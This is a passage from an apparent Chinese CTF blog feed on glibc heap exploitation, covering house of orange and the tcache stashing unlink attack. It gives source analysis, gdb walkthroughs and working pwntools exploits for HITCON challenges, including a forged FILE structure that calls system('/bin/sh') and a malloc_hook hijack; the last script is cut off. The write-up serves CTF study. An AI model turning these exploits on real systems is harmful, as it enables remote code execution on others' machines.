class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>malloc_printerr函数种会调用__libc_message函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111330571.png" title="image-20230511133005494" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111330571.png" alt="image-20230511133005494"></a></p><p>这个函数的内部就调用了abort函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111331891.png" title="image-20230511133146868" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111331891.png" alt="image-20230511133146868"></a></p><p>而abort内部调用了_IO_flush_all_lockp函数 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111332940.png" title="image-20230511133220920" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111332940.png" alt="image-20230511133220920"></a></p><p>于是就可以调用到fake file的io_overflow函数</p><p>同时我们再来看一下_IO_flush_all_lockp函数怎样才能调用了file结构体的io_overflow函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      &#123;</span><br><span class="line">        result = EOF;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>需要使得mode小于等于0 IO_write_ptr大于IO_write_base</p><p>那么就使得io_write_ptr &#x3D; 1 io_write_base &#x3D; mode &#x3D; 0即可</p><p>还有一点需要注意的是 main_arena+88的那个fake file 如果我们触发了_IO_flush_all_lockp函数 其如果满足上面的条件 也是会调用overflow函数 但是很明显不能在这里就调用overflow函数</p><p>如下图 _mode的值是否为正负和aslr和pie导致的地址随机化有关 所以这里存在一个概率打通的问题 需要mode为负才能打通</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111850000.png" title="image-20230511185011932" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111850000.png" alt="image-20230511185011932"></a></p><h1 id="真题分析"><a href="#真题分析" class="headerlink" title="真题分析"></a>真题分析</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange hitcon 2016"></a>houseoforange hitcon 2016</h2><p>add函数限制了申请chunk的size 小于等于0x1000</p><p>show函数可以打印堆块内容</p><p>edit函数存在堆溢出</p><p>但是没有释放堆块的函数 同时chunk指针只能保存一个 所以show和edit都只对最新申请的chunk有效</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111828689.png" title="image-20230511182824591" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305111828689.png" alt="image-20230511182824591"></a></p><p>申请一个chunk会额外申请两个chunk   低地址处的chunk存放着实际分配的chunk和第三个chunk的地址</p><p>中间的chunk是实际分配的chunk  第三个chunk是用来存放price和color 不过没啥用 这题的核心考点不在于这两个伴随堆块</p><p>利用上面提到的办法 来使得top chunk被释放进入unsortedbin 随后申请一个chunk 就可以泄露libc基址</p><p>并且 如果申请到的是一个largebin chunk 那么还可以顺便泄露一下堆地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x1f</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,cyclic(<span class="number">0x8</span>))</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5188</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">0x10</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show()</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc0</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>接下来就是利用unsortedbin attack来往io_list_all中写入main_arena的地址</p><p>随后计算偏移构造fake file</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_io = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x408</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)  <span class="comment">#填充到old top chunk</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>) <span class="comment">#覆盖size 使其释放到smallbin 0x60链表</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(fake_io-<span class="number">0x10</span>) <span class="comment">#伪造bk域</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#布局io_write_ptr和io_write_base</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#填充偏移</span></span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x5c8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr) <span class="comment">#伪造vtable结构体</span></span><br></pre></td></tr></table></figure><p>随后再次进入add函数 只要触发了malloc函数 就可以触发fake file</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,29861)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x1f</span>)+cyclic(<span class="number">0x10</span>)+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,cyclic(<span class="number">0x8</span>))</span><br><span class="line">show()</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5188</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">0x10</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">show()</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0xc0</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">fake_io = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x408</span>)+p64(<span class="number">0x21</span>)+cyclic(<span class="number">0x10</span>)</span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(fake_io-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_file + p64(<span class="number">0</span>)*<span class="number">3</span>+p64(heap_addr+<span class="number">0x5c8</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system_addr)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0xD68)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tcache stashing unlink attack</title>
      <link href="/2023/05/09/tcache-stashing-unlink-attack/"/>
      <url>/2023/05/09/tcache-stashing-unlink-attack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>house of pig用到的一个知识点 功能还是蛮独特的 同时十分简单 主要是基于calloc函数的特性 对于smallbin和tcachebin的一些操作 顺便吐槽一句 网上有的教程是写的真烂啊 压根没讲清楚 还得自己动调一下</p><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;</span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当我们使用calloc函数申请chunk的时候 其会忽略tcachebin中的chunk 比如我们申请一个0x10大小的chunk 释放到tcachebin中 再次调用calloc申请一个0x10的chunk 哪怕tcache中有合适的chunk 并且没有其他bin中有适合的chunk了 calloc还是会从top chunk中分配一个0x10的chunk</p><p>利用这一特性 我们就可以跳过tcachebin 从smallbin中申请chunk</p><p>上面的源码就是针对这种情况 当smallbin中有两个以上的chunk的时候 利用calloc申请出smallbin中的chunk 当tcache对应链表没满 同时smallbin还有同样大小的size时 就会把剩余的chunk放入到tcachebin中</p><p>并且在上面源码中 会发现并没有这样的检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p>也就是说 我们只需要通过第一次检测就可以了 后面的chunk都不用设置相关信息</p><p>那么我们就只要修改链表头chunk的bk域 使其满足条件 就可以利用漏洞</p><p>先来看看可以造成什么危害吧 分析一下tcache_put函数的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tcache_get (<span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>赋值了新放入tcachebin的chunk的fd域和key值</p><p>这里存在一个任意地址写 如果我们修改链表头chunk的bk域为一个fake chunk 那么接下来 fake chunk就会进入smallbin链表 充当下一次的tc_victim</p><p>在作为tcache_put的参数时 其fd域和存放key的地址就被赋值了</p><p>还有一种任意写的情况是  tcachebin中已经有了6个free chunk了 那么此时fake chunk就不会被放入tcache链表 仍然位于smallbin中 所以其fd域会填入main_arena的值 用来保证链表完整性</p><p>下面来结合gdb动调 看一下这两种任意写要如何构造</p><p>先看tcachebin有5个free chunk的情况</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100005326.png" title="image-20230510000502220" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100005326.png" alt="image-20230510000502220"></a></p><p>此时tcachebin中已经有了5个free chunk</p><p>我们称低地址处的smallbin chunk为chunk0 另外一个为chunk1</p><p>chunk0位于smallbin的链表头 我们修改chunk0的bk域 使其指向fake chunk</p><p>接着我们断点打在calloc函数 si单步进入 跟进到int_malloc函数 si单步进入</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100007358.png" title="image-20230510000709315" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100007358.png" alt="image-20230510000709315"></a></p><p>此时r14赋值后的值则为fake chunk的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100008787.png" title="image-20230510000818742" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100008787.png" alt="image-20230510000818742"></a></p><p>这一步赋值了fake chunk的bk域 到这里fake chunk已经进入了smallbin 来看一下目前其fd域和bk域</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100009783.png" title="image-20230510000947759" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305100009783.png" alt="image-20230510000947759"></a></p><p>接下来fake chunk要被放入到tcachebin中 并且fd域和key值需要重新赋值</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101238395.png" title="image-20230510123807270" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101238395.png" alt="image-20230510123807270"></a></p><p>下图可以看到 fd域已经成功被修改</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101239792.png" title="image-20230510123900763" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101239792.png" alt="image-20230510123900763"></a></p><p>接下来 这个cmp是绕过的关键</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101239297.png" title="image-20230510123954264" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101239297.png" alt="image-20230510123954264"></a></p><p>r13为此时tcachebin链表中的chunk数  可以看到 chunk1和fake chunk都被放入了链表中 此时不会进行额外的检查 任意写顺利结束</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101243067.png" title="image-20230510124304042" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101243067.png" alt="image-20230510124304042"></a> </p><p>最后的攻击效果为fake chunk被并入链表中 同时fake chunk+0x10处写入了堆地址</p><p>当然 上面的执行流程看起来没有多少检查 但是实际上存在一个需要注意的地方</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101251441.png" title="image-20230510125137391" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101251441.png" alt="image-20230510125137391"></a></p><p>这里需要保证我们fake chunk+0x18处为一个可写地址 如果为空 那么r14会被赋值为0 执行到下面这步时 会由于为空 导致无法写入 程序无法执行下去</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101254209.png" title="image-20230510125437168" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101254209.png" alt="image-20230510125437168"></a></p><p>如果tcachebin中的chunk小于5个呢  这意味着我们上面提到的cmp肯定过不去 会进入另外一个分支</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101305848.png" title="image-20230510130556797" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101305848.png" alt="image-20230510130556797"></a></p><p>可以看到面临和上面一样的问题 所以又回归到了上面的问题 那么我们有没有办法做到真正的任意地址写一个main</p><p>_arena地址呢</p><p>只需要使得tcachebin中已经有6个free chunk 就可以使得fake chunk不被放入tcachebin中  使得其fd域不需要进行赋值 同时由于fake chunk仍然处于smallbin中 其fd域为main_arena的地址 而非堆地址 来看一下实际的效果</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101309344.png" title="image-20230510130903307" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101309344.png" alt="image-20230510130903307"></a></p><h1 id="真题分析"><a href="#真题分析" class="headerlink" title="真题分析"></a>真题分析</h1><h2 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h2><p>复现环境可以在buuctf中找到  libc版本为2.29</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101311120.png" title="image-20230510131138077" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101311120.png" alt="image-20230510131138077"></a></p><p>保护全开 同时开启了沙盒 只能通过orw来获取flag</p><p>程序的主题逻辑就是一个菜单题 add函数通过calloc来申请chunk 同时对chunk的size存在限制0x80-0x400  不存在堆溢出 free chunk的时候指针没有置零 存在UAF 同时拥有打印chunk内容的机会 并且还有一个特殊的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_15BB</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(qword_4030 + <span class="number">32</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_2128);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检测tcache链表中的chunk数 只有大于6才能调用该函数 利用malloc申请一个0x217大小的chunk 实际上是分配一个0x210的chunk</p><p>首先利用UAF 重复释放chunk 填满tcachebin 使chunk释放进入unsortedbin 泄露libc地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,cyclic(<span class="number">0x210</span>))</span><br><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x80</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">0</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e4ca0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>接着构造出两个同样大小的smallbin chunk 准备进行任意写攻击</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x180</span>))</span><br><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x400</span>))</span><br><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,cyclic(<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x370</span>))</span><br><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x400</span>))</span><br></pre></td></tr></table></figure><p>此时tcache对应链表中有6个chunk 此时可以往ptr_addr+0x10写入一个libc地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x370</span>))</span><br><span class="line">add(<span class="number">2</span>,cyclic(<span class="number">0x400</span>))</span><br><span class="line">fd = heap_addr + <span class="number">0x180</span></span><br><span class="line">bk = heap_addr - <span class="number">0x260</span> + <span class="number">0x20</span></span><br><span class="line">payload = cyclic(<span class="number">0x370</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fd)+p64(bk)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,cyclic(<span class="number">0x80</span>))</span><br></pre></td></tr></table></figure><p>这里选择往tcache结构体中写入</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101335661.png" title="image-20230510133511624" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101335661.png" alt="image-20230510133511624"></a></p><p>覆盖了0x220链表的chunk数量</p><p>接着就可以利用特殊函数打tcachebin attack任意写了 不过由于要用orw 再加上这题的add函数有点特殊 是先读入chunk内容 再申请chunk 接着复制内容进入chunk中 所以payload会先写在栈上 那么我们劫持malloc_hook为跳转执行栈上的rop链即可</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101337038.png" title="image-20230510133752970" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305101337038.png" alt="image-20230510133752970"></a></p><p>可以看到偏移0x40处为写入的rop链 那么此时只需要覆盖malloc_hook为add rsp，0x40 即可跳转执行rop链</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,29861)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span 